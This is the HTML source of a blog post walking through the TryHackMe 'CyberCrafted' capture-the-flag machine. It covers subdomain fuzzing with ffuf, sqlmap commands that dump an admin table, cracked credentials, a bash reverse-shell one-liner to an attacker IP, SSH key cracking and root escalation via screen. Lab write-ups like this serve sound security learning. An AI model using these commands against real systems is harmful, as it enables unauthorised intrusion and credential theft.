@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="https://ybenel.cf/favicon.ico"/>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>THM - CyberCrafted | Ybenel</title>
+<meta name="generator" content="Jekyll v4.2.1" />
+<meta property="og:title" content="THM - CyberCrafted" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="A Medium Linux Machine That Consist Of Exploiting A Minecraft Server." />
+<meta property="og:description" content="A Medium Linux Machine That Consist Of Exploiting A Minecraft Server." />
+<meta property="og:site_name" content="Ybenel" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-11-22T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="THM - CyberCrafted" />
+<meta name="twitter:site" content="@_ybenel" />
+<script type="application/ld+json">
+{"description":"A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/logo.ico"}},"url":"/thm/2021/11/22/THM-CyberCrafted.html","headline":"THM - CyberCrafted","dateModified":"2021-11-22T00:00:00+01:00","datePublished":"2021-11-22T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/thm/2021/11/22/THM-CyberCrafted.html"},"@type":"BlogPosting","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Ybenel" />
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-12S7XTXXWH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-12S7XTXXWH');
+</script>
+
+
+
+
+
+<!-- Google Fonts -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans|Roboto|Roboto%20Slab|Roboto%20Mono|Dancing%20Script|Noto%20Sans%20SC|Noto%20Sans%20TC|Noto%20Serif%20SC|Noto%20Serif%20TC|Ma%20Shan%20Zheng">
+
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="/assets/css/skin.css">
+
+<!-- Begin selecting skin -->
+
+  <script>
+    const hour = (new Date()).getHours();
+    let filename = "";
+    if (hour >= 5 && hour < 7) {
+      filename = "/assets/css/skin-sunrise.css";
+    } else if (hour >= 7 && hour < 17) {
+      filename = "/assets/css/skin-daylight.css";
+    } else if (hour >= 17 && hour < 19) {
+      filename = "/assets/css/skin-sunset.css";
+    } else {
+      filename = "/assets/css/skin-midnight.css";
+    }
+    const elem = document.createElement("link");
+    elem.setAttribute("rel", "stylesheet");
+    elem.setAttribute("type", "text/css");
+    elem.setAttribute("href", filename);
+    document.getElementsByTagName("head")[0].appendChild(elem);
+  </script>
+
+<!-- End selecting skin -->
+
+<script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+
+
+  </head>
+
+  <body>
+    <div class="site-container">
+      <header class="site-header">
+        <div class="wrapper">
+  <script>
+    function clickSidebarButton() {
+      const elem = document.getElementById("site-sidebar")
+      if (elem.style.display == "none" || elem.style.display == "") {
+        elem.style.display = "block";
+      } else {
+        elem.style.display = "none";
+      }
+    }
+  </script>
+  <a class="site-sidebar-button" onclick="clickSidebarButton()"><i class="far fa-user"></i>
+  </a>
+
+  <a class="site-title" rel="author" href="/">Ybenel</a>
+
+  
+    <nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger" title="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <ul class="trigger">
+              <li><a class="" href="/photos/">Photos</a></li>
+            
+              <li><a class="" href="https://music.ybenel.cf">Music</a></li>
+            
+              <li><a class="" href="/about/">About</a></li>
+            
+              <li class="dropdown" href="#">
+                <a href="javascript:void(0)" class="dropbtn">More</a>
+                <div class="dropdown-content">
+                    <a class="" href="/years/">Years</a>
+                    <a class="" href="/categories/">Categories</a>
+                    <a class="" href="/tags/">Tags</a>
+                </div>
+              </li>
+            </ul>
+    </nav>
+  
+</div>
+
+      </header>
+
+      <div class="site-body wrapper">
+        <aside class="site-sidebar" id="site-sidebar">
+          
+            <h3 class="toc-title">Table of Contents</h3>
+<nav class="toc-nav">
+  <ul class="toc">
+  <li><a href="#user-enumeration">User Enumeration</a>
+    <ul>
+      <li><a href="#open-ports">Open Ports</a></li>
+      <li><a href="#initial-enum">Initial Enum</a></li>
+      <li><a href="#interesting-discoveries">Interesting Discoveries</a></li>
+      <li><a href="#vulnerabilities-and-exploitation">Vulnerabilities And Exploitation</a></li>
+      <li><a href="#usernames-and-passwords">Usernames And Passwords</a></li>
+      <li><a href="#command-execution">Command Execution</a></li>
+    </ul>
+  </li>
+  <li><a href="#privilege-escalation">Privilege Escalation</a>
+    <ul>
+      <li><a href="#interesting-discoveries-1">Interesting Discoveries</a></li>
+      <li><a href="#possible-paths">Possible Paths</a></li>
+      <li><a href="#vulnerabities-exploitation">Vulnerabities Exploitation</a></li>
+    </ul>
+  </li>
+</ul>
+
+</nav>
+
+          
+        </aside>
+        <main class="site-main" id="site-main" aria-label="Content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+
+    <h1 class="post-title p-name" itemprop="name headline">THM - CyberCrafted</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2021-11-22T00:00:00+01:00" itemprop="datePublished">
+        Nov 22, 2021
+      </time>• 
+          <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+            <span class="p-author h-card" itemprop="name">ybenel</span></span></p>
+
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.</p>
+
+<h2 id="user-enumeration">User Enumeration</h2>
+
+<h3 id="open-ports">Open Ports</h3>
+
+<ul>
+  <li>22 ’ssh’ (Ubuntu) , 80 “Apache Httpd 2.4.49” , 25565 “Minecraft Server” ( Full Port Scan )</li>
+</ul>
+
+<h3 id="initial-enum">Initial Enum</h3>
+
+<ul>
+  <li>10.10.212.240 <em>Redirect</em> To #<a href="http://cybercrafted.thm/">http://cybercrafted.thm/</a>#</li>
+  <li>In Root Page We See a hint <strong><em>A Note to the developers: Just finished up adding other subdomains, now you can work on them!</em></strong>
+    <ul>
+      <li>Let’s find those subdomains !</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Found a bunch of subdomains using ffuf.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /opt/wordlists/raft-medium-words.txt:SUBS <span class="nt">-H</span> <span class="s2">"Host: SUBS.cybercrafted.thm"</span> <span class="nt">-u</span> http://10.10.212.240 <span class="nt">-fs</span> 0
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Subs Found:
+admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
+store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 100ms]
+www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 86ms]
+</code></pre></div></div>
+
+<ul>
+  <li>Login Page at <a href="http://admin.cybercrafted.thm/login.php">http://admin.cybercrafted.thm/login.php</a></li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://admin.cybercrafted.thm/FILE.php -mc 200,302</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>panel                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 90ms]
+login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3023ms]
+index                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 5030ms]
+</code></pre></div></div>
+
+<ul>
+  <li>Found Search Engine At <a href="http://store.cybercrafted.thm/search.php">http://store.cybercrafted.thm/search.php</a></li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /opt/wordlists/raft-medium-words.txt:FILE <span class="nt">-u</span> http://store.cybercrafted.thm/FILE.php <span class="nt">-mc</span> 200,302
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search                  [Status: 200, Size: 838, Words: 162, Lines: 28, Duration: 106ms]
+</code></pre></div></div>
+
+<h3 id="interesting-discoveries">Interesting Discoveries</h3>
+
+<ul>
+  <li>Potential sql injection in <a href="http://store.cybercrafted.thm/search.php">http://store.cybercrafted.thm/search.php</a></li>
+</ul>
+
+<h3 id="vulnerabilities-and-exploitation">Vulnerabilities And Exploitation</h3>
+
+<p>Time-Based Blind Sql Injection In <a href="http://store.cybercrafted.thm/search.php">http://store.cybercrafted.thm/search.php</a>
+<code class="language-plaintext highlighter-rouge">search=&lt;Payload&gt;&amp;submit</code>
+Using Sqlmap to automate exploitation of our sql injecetion .</p>
+
+<ul>
+  <li>
+    <p>Tables (Database: Webapp)</p>
+
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://store.cybercrafted.thm/search.php <span class="nt">--data</span> <span class="s2">"search=*&amp;submit="</span> <span class="nt">--tables</span>
+</code></pre></div>    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>admin</td>
+        </tr>
+        <tr>
+          <td>stock</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <p>Columns (Table Admin)</p>
+
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://store.cybercrafted.thm/search.php <span class="nt">--data</span> <span class="s2">"search=*&amp;submit="</span> <span class="nt">--tamper</span><span class="o">=</span>space2comment <span class="nt">-D</span> webapp <span class="nt">-T</span> admin <span class="nt">--columns</span> <span class="nt">--threads</span><span class="o">=</span>10
+</code></pre></div>    </div>
+
+    <table>
+      <thead>
+        <tr>
+          <th style="text-align: left">Columns</th>
+          <th>Type</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="text-align: left">user</td>
+          <td>varchar(32)</td>
+        </tr>
+        <tr>
+          <td style="text-align: left">hash</td>
+          <td>varchar(64)</td>
+        </tr>
+        <tr>
+          <td style="text-align: left">id</td>
+          <td>int(10) unsigned</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <p>Columns Dump</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   sqlmap <span class="nt">-u</span> http://store.cybercrafted.thm/search.php <span class="nt">--data</span> <span class="s2">"search=*&amp;submit="</span> <span class="nt">--tamper</span><span class="o">=</span>space2comment <span class="nt">-D</span> webapp <span class="nt">-T</span> admin <span class="nt">--dump</span> <span class="nt">--threads</span><span class="o">=</span>10 
+</code></pre></div>    </div>
+
+    <table>
+      <thead>
+        <tr>
+          <th style="text-align: left">id</th>
+          <th>hash</th>
+          <th>user</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="text-align: left">1</td>
+          <td>88b949dd5cdfbeAAAAAAAAbfa24e5974234e7c01</td>
+          <td>xXUltimateCreeperXx</td>
+        </tr>
+        <tr>
+          <td style="text-align: left">4</td>
+          <td>THM{bbe3159060AAAAAAAd9b195001f75008}</td>
+          <td>web_flag</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <p>Web Flag</p>
+  </li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">THM{bbe3159060AAAAAAAAd9b195001f75008}</code></p>
+
+<h3 id="usernames-and-passwords">Usernames And Passwords</h3>
+
+<ul>
+  <li>
+    <p>Password Hash Cracked thanks to <span style="color:blue"><em>crackstation</em></span></p>
+
+    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"xXUltimateCreeperXx"</span><span class="p">:</span><span class="w"> </span><span class="s2">"diamondAAAAAAAA"</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="command-execution">Command Execution</h3>
+
+<p>After grabbing credentials we can login to <a href="http://admin.cybercrafted.thm">http://admin.cybercrafted.thm</a>
+In <a href="http://admin.cybercrafted.thm/panel.php">http://admin.cybercrafted.thm/panel.php</a> we can execute commands</p>
+
+<p><img src="https://ybenel.cf/imgs/cybercrafted/rce.png" alt="img" /></p>
+
+<p>We can then spawn a reverse shell and pwn the system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -i &gt;&amp; /dev/tcp/10.8.134.23/9110 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><img src="https://ybenel.cf/imgs/cybercrafted/reverseshell.png" alt="img" /></p>
+
+<p><img src="https://ybenel.cf/imgs/cybercrafted/curl.png" alt="img" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="interesting-discoveries-1">Interesting Discoveries</h3>
+
+<ul>
+  <li>Found 2 Users (xxultimatecreeperxx, cybercrafted)</li>
+  <li><code class="language-plaintext highlighter-rouge">xxultimatecreeperxx</code> Has encrypted ssh key in <span style="color:purple"><em>/home/xxultimatecreeperxx/.ssh</em></span></li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/cybercrafted/ssh_enc.png" alt="img" /></p>
+
+<ul>
+  <li>Attempting to crack with john will give us the following password.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/cybercrafted/ssh_crack.png" alt="img" /></p>
+
+<ul>
+  <li>Login in as <code class="language-plaintext highlighter-rouge">xxultimatecreeperxx</code></li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/cybercrafted/creeper.png" alt="img" /></p>
+
+<ul>
+  <li>Minecraft Server Flag</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">THM{ba93767ae3db9f5AAAAAAAA40a0c99e}</code></p>
+
+<h3 id="possible-paths">Possible Paths</h3>
+
+<ul>
+  <li>Sketchy files at <em>opt/minecraft</em></li>
+</ul>
+
+<h3 id="vulnerabities-exploitation">Vulnerabities Exploitation</h3>
+
+<ul>
+  <li>
+    <p>Logging System Plugin Located in /opt/minecraft/cybercrafted/plugins/LoginSystem
+Which Contains Username/Password (hashed)</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cybercrafted: dcbf543ee264e2d3a32c967d663e979e
+madrinch: 42f749ade7f9e195bf475f37a44cafcb
+</code></pre></div>    </div>
+
+    <p>Yet There’s a log file which contains plain text password of both users</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdiAAAAAAAAAA
+[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:59:01] madrinch logged in. PW: Password123
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Ssh in as <code class="language-plaintext highlighter-rouge">cybercrafted</code> we can read the user flag and we can also see that we can execute <strong>screen</strong> as <strong>root</strong>.</p>
+
+    <p><img src="https://ybenel.cf/imgs/cybercrafted/screen_user.png" alt="img" /></p>
+  </li>
+  <li>
+    <p>We can Reattach to instance of <code class="language-plaintext highlighter-rouge">cybercrafted</code> then we can create a new window with <strong>C-a c</strong> And read the root flag.</p>
+
+    <p><img src="https://ybenel.cf/imgs/cybercrafted/root_ins.png" alt="img" /></p>
+  </li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    
+      <div class="post-meta">
+        <i class="fas fa-folder"></i>
+        <ul class="post-taxonomies post-categories">
+          
+          
+            <li class="post-category">
+              
+              <a href="/categories/#thm">THM</a>
+            </li>
+          
+        </ul>
+      </div>
+    
+
+    
+      <div class="post-meta">
+        <i class="fas fa-tags"></i>
+        <ul class="post-taxonomies post-tags">
+          
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#mediumm">mediumm</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#minecraft">minecraft</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#sql">sql</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#sql-injection">sql-injection</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#sqlmap">sqlmap</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#thm">thm</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#fuff">fuff</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#screen">screen</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#subdomains">subdomains</a>
+            </li>
+          
+        </ul>
+      </div>
+    
+
+    <nav class="post-pagination" role="navigation">
+      
+        <a class="post-previous" href="/htb/2021/09/17/Pikaboo.html">
+          <i class="fas fa-arrow-left"></i> HTB - Pikaboo
+
+        </a>
+      
+    
+      
+    </nav>
+  </footer>
+
+  
+  
+</article>
+
+          <footer class="site-footer">
+            <div class="footer-col-wrapper">
+
+  <div class="footer-col">
+    <div class="copyright">
+      
+      
+      
+        <!--  -->
+        
+      
+      
+      <p>Copyright © 2021 Ybenel; All rights reserved.</p>
+      
+    </div>
+    <!-- <p>
+      Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://github.com/ngzhio/jekyll-theme-hamilton">Hamilton</a>
+    </p> -->
+  </div>
+
+  <div class="footer-col">
+    <p>Where Knowledge is peace of cake.</p>
+  </div>
+</div>
+
+          </footer>
+        </main>
+      </div>
+    </div>
+  </body>
+
+</html>
